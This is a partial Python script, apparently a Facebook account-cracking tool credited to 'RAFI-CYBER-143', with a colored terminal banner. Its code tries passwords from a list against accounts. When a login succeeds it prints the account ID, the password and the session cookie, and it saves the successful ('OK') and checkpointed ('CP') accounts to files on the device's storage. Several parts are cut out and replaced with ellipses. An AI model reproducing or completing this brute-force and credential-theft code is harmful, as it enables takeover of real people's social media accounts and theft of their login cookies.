...
'-'  '-'    (__)   (__)      (__)      
       ...
       ┌━━━━━━━━━━━━━━━━━ SAMIR ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  RAFI XHOWDHURY           
               \033[1;91mFACEBOK      :  ARIYAN RAFI             
               \033[1;97mGITHUB       :  RAFI-CYBER-143       
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO RAFI-CYBER-143 TOOLS🔥')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[RAFI-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/RAFI-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[RAFI-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/RAFI-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
